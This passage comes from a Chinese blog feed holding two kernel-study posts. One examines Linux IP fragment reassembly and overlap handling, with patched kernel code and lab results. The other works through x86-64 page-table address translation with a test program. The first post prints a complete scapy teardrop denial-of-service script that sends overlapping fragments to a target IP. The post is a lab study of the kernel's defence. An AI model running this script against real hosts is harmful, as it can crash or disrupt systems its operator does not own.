class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">/* We found <span class="built_in">where</span> to put this one.  Check <span class="keyword">for</span> overlap with</span><br><span class="line"> * preceding fragment, and, <span class="keyword">if</span> needed, align things so that</span><br><span class="line"> * any overlaps are eliminated.</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">if</span> (prev) &#123;</span><br><span class="line">int i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i &gt; 0) &#123;</span><br><span class="line">offset += i;</span><br><span class="line">err = -EINVAL;</span><br><span class="line">printk(<span class="string">&quot;############ overlap before package ****\n&quot;</span>);</span><br><span class="line">ipq_kill(qp); //标记失效</span><br><span class="line">goto err;</span><br><span class="line"><span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line">goto err;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line">goto err;</span><br><span class="line"><span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line">int i = end - FRAG_CB(next)-&gt;offset; /* overlap is <span class="string">&#x27;i&#x27;</span> bytes */</span><br><span class="line">printk(<span class="string">&quot;overlap after package*****************\n&quot;</span>);</span><br><span class="line">err=-EINVAL;</span><br><span class="line">ipq_kill(qp);  //标记失效</span><br><span class="line">goto err;</span><br><span class="line"><span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line">/* Eat head of the next overlapped fragment</span><br><span class="line"> * and leave the loop. The next ones cannot overlap.</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line">goto err;</span><br><span class="line">FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">qp-&gt;q.meat -= i;</span><br><span class="line"><span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line">/* Old fragment is completely overridden with</span><br><span class="line"> * new one drop it.</span><br><span class="line"> */</span><br><span class="line">next = next-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prev)</span><br><span class="line">prev-&gt;next = next;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">frag_kfree_skb(qp-&gt;q.net, free_it, NULL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现有重叠就把这个链表全部丢掉,为什么调用ipq_kill函数就行了呢?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Kill ipq entry. It is not destroyed immediately,</span></span><br><span class="line"><span class="comment"> * because caller (and someone more) holds reference count.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ipq_kill</span><span class="params">(struct ipq *ipq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">inet_frag_kill(&amp;ipq-&gt;q, &amp;ip4_frags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看内核代码注释就知道,然后跟进去.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inet_frag_kill</span><span class="params">(struct inet_frag_queue *fq, struct inet_frags *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (del_timer(&amp;fq-&gt;timer))</span><br><span class="line">atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(fq-&gt;last_in &amp; INET_FRAG_COMPLETE)) &#123;</span><br><span class="line">fq_unlink(fq, f);</span><br><span class="line">atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line">fq-&gt;last_in |= INET_FRAG_COMPLETE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现只是删除了定时器并减少了引用计数.如果检测到包分片没有收完,则将fq从哈希链表中和lru链表中移除.并减少引用计数.置收完标志位.而虽然这个函数没有直接销毁这个队列链表,但是当ip_frag_queue返回的时候,再次调用ipq_put-&gt;inet_frag_put就知道了,原子性减1并测试是否为0,如果是,则直接调用inet_frag_destroy销毁整个分片队列并回收资源.在这里需要跟一下引用计数,看什么时候才为0,并且一开始被创建的时候是为1的,而每次定时器操作以及分片操作的时候会增加1,操作完之后又会put而减1.</p><h1 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h1><p>从网络上down了一份如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">len</span>(sys.argv)</span><br><span class="line"><span class="keyword">if</span> total != <span class="number">3</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Performs teardrop attack from Kali Linux&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Usage: ./tear TARGET-IP ATTACK-CODE&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   Attack Codes:&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   0: small payload (36 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes&quot;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">target=<span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">attack=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Attacking target &#x27;</span> + target + <span class="string">&#x27; with attack &#x27;</span> + attack</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attack == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 0&quot;</span></span><br><span class="line">  size=<span class="number">36</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line"></span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 1&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span> </span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 2&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attacking with attack 2&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.frag=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet 0&quot;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    i.frag=offset</span><br><span class="line">    offset=offset+<span class="number">80</span></span><br><span class="line">    send(i/load)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet &quot;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">  </span><br><span class="line">  i.frag=offset</span><br><span class="line">  i.flags=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 3&quot;</span></span><br><span class="line">  size=<span class="number">1336</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:         <span class="comment"># attack == 4</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 4&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">10</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done!&quot;</span></span><br></pre></td></tr></table></figure><p>要运行这份代码首先要用py安装scapy库,代码为了简单几乎连exit不想写了,因此直接运行记得要加参数.数据包填充也很简单,就是一直重叠分片,如果在Windows上用wireshark抓包则组包成一个之后会显示坏的包.</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>在测试机器上运行shell命令,监控printk打印.<br><code>[root@localhost linux-2.6.32.27]# while :;do dmesg -c 5; sleep 1; done</code><br>我还是用的是上次测试Linux内存段页式转换那一台Centos6.9,从kernel.org下载一份2.6内核的代码重新编译.直接<code>make localmodconfig</code>,一路回车,之后<code>make -j8 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; reboot</code>即可.测试结果如下:<br><img src="/images/teardrop_attack_tcpdump.png" alt="teardrop_attack_tcpdump.png"><br><img src="/images/teardrop_attack_printk.png" alt="teardrop_attack_printk.png"><br>我是将命令码从4.3.2.1.0执行了一遍,可以分析得出基本是每两个包就造成一次释放分片链表,而截断长度为显示为0的分片包重组的时候没有报重叠,有一个覆盖后面的有可能是由于分片包到的顺序不一致,因而攻击代码2是最明显的,如果要打出具体的攻击IP则应该利用skb结构体来打更多信息.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要研究学习了下内核中IP分片包重组算法以及引用计数如何到0来使得整个分片链表被释放的.</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;按照要求要丢弃掉这种数据包…&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="network security" scheme="https://embpgp.github.io/tags/network-security/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Memory_Address_Mapping</title>
    <link href="https://embpgp.github.io/2017/10/14/Linux-Memory-Address-Mapping/"/>
    <id>https://embpgp.github.io/2017/10/14/Linux-Memory-Address-Mapping/</id>
    <published>2017-10-14T10:49:21.000Z</published>
    <updated>2025-03-11T12:14:38.960Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 主要根据<a href="http://www.ilinuxkernel.com/">www.ilinuxkernel.com</a>站点上的同名pdf文档做实验分析</p></blockquote><span id="more"></span><hr><p>参考:<a href="https://jin-yang.github.io/post/kernel-memory-virtual-physical-map.html">https://jin-yang.github.io/post/kernel-memory-virtual-physical-map.html</a><br><a href="https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module">https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module</a><br><a href="http://www.voidcn.com/article/p-zqylmcig-ty.html">http://www.voidcn.com/article/p-zqylmcig-ty.html</a><br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011261.html">http://www.cnblogs.com/hoys/archive/2011/04/10/2011261.html</a></p><h1 id="体系架构"><a href="#体系架构" class="headerlink" title="体系架构"></a>体系架构</h1><p>首先要了解操作系统的内存管理机制,一般都是知道是段页式管理,但是各个处理器架构提供的机制有所不同,主要由处理器中mmu部件负责翻译,操作系统负责管理.特别在intel架构中,完全做到了段页式的实现.但是Linux内核在实现的时候是用技巧越过了段式的地址特性,即逻辑地址=线性地址,但是处理器对于地址转换的有效性的检查不会改变,只是说Linux内核实现比较巧妙.下面就开始实验.</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>原文给我的实验代码是Linux 2.6内核的代码,我特意从网上下载了Centos6.9,之后<code>yum install kernel-devel.x86_64</code>安装发行版内核源代码,同时查看<code>build</code>目录是否正确链接到内核源码路径,可修改实验代码的Makefile文件的路径使其正确.当然,为了能够使得我PC的Linux 4.x内核也能够做这个实验,我对比了内核代码的改动部分,其中主要是<code>proc_create</code>接口变了,然后参考网上demo代码成功实现了迁移.可参考<a href="https://github.com/Iotlab-404/ilinuxkernel/tree/master/kernel/Memory_Address_Mapping">这里</a>.</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="mem-map"><a href="#mem-map" class="headerlink" title="mem_map"></a>mem_map</h2><p>编译好内核模块后insmod两个ko文件,因为我的测试环境为64位,因此修改mem_map.c的部分代码,运行如下:<br><img src="/images/ilk_mm_exam.png" alt="ilk_mm_exam.png"></p><h2 id="fileview"><a href="#fileview" class="headerlink" title="fileview"></a>fileview</h2><p>这个工具跟内核模块dram.ko挂钩,通过实现了lseek和read文件操作方法来对应用层开放查询进程物理地址信息.具体操作可见代码,其中主要可以按照显示方式为8421字节感觉很有用,若需要输入指定物理地址,按回车即可.</p><h2 id="开始计算"><a href="#开始计算" class="headerlink" title="开始计算"></a>开始计算</h2><h3 id="查看gdt中ds描述符"><a href="#查看gdt中ds描述符" class="headerlink" title="查看gdt中ds描述符"></a>查看gdt中ds描述符</h3><p>按照pdf教程,tmp所在段在ds数据段,查看后发现确实段基址为0.<br> <img src="/images/ilk_mm_gdtr.png" alt="ilk_mm_gdtr.png"></p><h3 id="分解tmp地址为二进制"><a href="#分解tmp地址为二进制" class="headerlink" title="分解tmp地址为二进制"></a>分解tmp地址为二进制</h3><p>计算偏移的工具bc,我将其封装了一下,命名为calc.sh,代码在<a href="https://github.com/embpgp/PersonalToolKits/blob/master/shell/calc.sh">这里</a>.tmp地址分解如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 16 -o 2 7FFD0A1330C8</span></span><br><span class="line">11111111111110100001010000100110011000011001000</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>应该为分成9 9 9 9 12.<br>011111111 111110100 001010000 100110011 000011001000</p><h3 id="CR3-gt-一级"><a href="#CR3-gt-一级" class="headerlink" title="CR3-&gt;一级"></a>CR3-&gt;一级</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*11111111</span></span><br><span class="line">7F8</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>CR3=36082000,一级=36082000+8*011111111b=360827F8<br><img src="/images/ilk_mm_cr3-one.png" alt="ilk_mm_cr3-one.png"></p><h3 id="一级-gt-二级"><a href="#一级-gt-二级" class="headerlink" title="一级-&gt;二级"></a>一级-&gt;二级</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*111110100</span></span><br><span class="line">FA0</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br><span class="line">````</span><br><span class="line">一级=391B8000,二级=391B8000+8*111110100=391B8FA0</span><br><span class="line">![ilk_mm_one-two.png](/images/ilk_mm_one-two.png)</span><br><span class="line"><span class="comment">### 二级-&gt;三级</span></span><br><span class="line">二级=3D817000,三级=3D817000+8*001010000=3D817280</span><br><span class="line">```bash</span><br><span class="line">root@Rutk1t0r:rutk1t0r<span class="comment"># calc.sh -i 2 -o 16 8*001010000</span></span><br><span class="line">280</span><br><span class="line">root@Rutk1t0r:rutk1t0r<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/images/ilk_mm_two-three.png" alt="ilk_mm_two-three.png"></p><h3 id="三级-gt-四级"><a href="#三级-gt-四级" class="headerlink" title="三级-&gt;四级"></a>三级-&gt;四级</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*100110011</span></span><br><span class="line">998</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>三级=3B04B000,四级=3B04B000+8*100110011=3B04B998<br><img src="/images/ilk_mm_three-four.png" alt="ilk_mm_three-four.png"></p><h3 id="四级-gt-真实物理地址-值"><a href="#四级-gt-真实物理地址-值" class="headerlink" title="四级-&gt;真实物理地址(值)"></a>四级-&gt;真实物理地址(值)</h3><p>四级=27D0F000,phy_addr=27D0F000+0c8=27D0F0C8.<br><img src="/images/ilk_mm_four-phy.png" alt="ilk_mm_four-phy.png"><br> 而mem_map.c代码如下:<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> [root@localhost mm_addr]<span class="meta"># cat mem_map.c </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> REGISTERINFO <span class="meta-string">&quot;/proc/sys_reg&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE  4096</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> FILE_TO_BUF(filename, fd) do&#123;\</span></span><br><span class="line"><span class="meta">static int local_n;\</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">if</span> (fd == - 1 &amp;&amp; (fd = open(filename, O_RDONLY)) == - 1) &#123;\</span></span><br><span class="line"><span class="meta">fprintf(stderr, <span class="meta-string">&quot;Open /proc/register file failed! \n&quot;</span>);\</span></span><br><span class="line"><span class="meta">fflush(NULL);\</span></span><br><span class="line"><span class="meta">_exit(102);\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">lseek(fd, 0L, SEEK_SET);\</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">if</span> ((local_n = read(fd, buf , sizeof buf -  1)) &lt; 0) &#123;\</span></span><br><span class="line"><span class="meta">perror(filename);\</span></span><br><span class="line"><span class="meta">fflush(NULL);\</span></span><br><span class="line"><span class="meta">_exit(103);\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">buf [local_n] = 0;\</span></span><br><span class="line"><span class="meta"> &#125;while(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp;</span><br><span class="line">tmp = <span class="number">0x12345678deadbeef</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> cr_fd = - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;movq %rbp, %rbx\n movq %rbx, addr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%%rbp:0x%08lX\n&quot;</span>, addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmp address:0x%08lX\n&quot;</span>, &amp;tmp);</span><br><span class="line">FILE_TO_BUF(REGISTERINFO, cr_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf );</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span 